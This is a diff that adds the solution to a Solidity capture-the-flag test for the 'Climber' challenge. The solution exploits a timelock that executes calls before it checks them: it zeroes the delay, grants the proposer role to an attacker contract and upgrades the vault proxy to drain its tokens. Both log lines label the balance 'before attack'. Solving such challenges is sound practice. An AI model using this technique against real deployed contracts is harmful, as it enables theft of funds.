@@ -7,6 +7,9 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {console2} from "forge-std/console2.sol";
+import {ClimberTimelockAttacker} from "../../src/climber/solution/ClimberTimelockAttacker.sol";
+import {ClimberVaultAttackImplementation} from "../../src/climber/solution/ClimberVaultAttackImplementation.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -85,7 +88,37 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        console2.log("Vault DVT tokens balance before attack", token.balanceOf(address(vault)));
+
+        ClimberTimelockAttacker attacker = new ClimberTimelockAttacker();
+        address[] memory targets = new address[](3);
+        uint256[] memory values = new uint256[](3);
+        bytes[] memory dataElements = new bytes[](3);
+
+        targets[0] = address(timelock);
+        targets[1] = address(timelock);
+        targets[2] = address(attacker);
+        values[0] = 0 wei;
+        values[1] = 0 wei;
+        values[2] = 0 wei;
+        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, uint64(0));
+        dataElements[1] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(attacker));
+        dataElements[2] = abi.encodeWithSignature(
+            "attackOperationSchedule(address,address[],uint256[],bytes[])",
+            address(timelock),
+            targets,
+            values,
+            dataElements
+        );
+        timelock.execute(targets, values, dataElements, bytes32("grant proposer role"));
+
+        ClimberVaultAttackImplementation attackImplementation = new ClimberVaultAttackImplementation();
+
+        attacker.attackClimberVault(
+            payable(address(timelock)), address(attackImplementation), address(vault), address(recovery), address(token)
+        );
+
+        console2.log("Vault DVT tokens balance before attack", token.balanceOf(address(vault)));
     }
 
     /**
